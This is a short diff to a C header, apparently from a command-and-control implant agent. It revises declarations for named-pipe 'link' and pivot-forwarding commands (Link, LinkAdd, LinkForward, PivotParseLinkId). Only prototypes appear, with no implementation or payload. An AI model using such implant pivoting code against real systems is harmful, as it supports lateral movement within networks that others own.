@@ -7,8 +7,10 @@
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_LINK
-VOID Link(PCHAR taskUuid, PPARSER arguments);
-BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen );
+VOID Link( PCHAR taskUuid, PPARSER arguments );
+BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen );
+BOOL LinkForward( PPARSER delegates );
+UINT32 PivotParseLinkId( PVOID buffer, SIZE_T size );
 #endif
 
 #ifdef INCLUDE_CMD_UNLINK
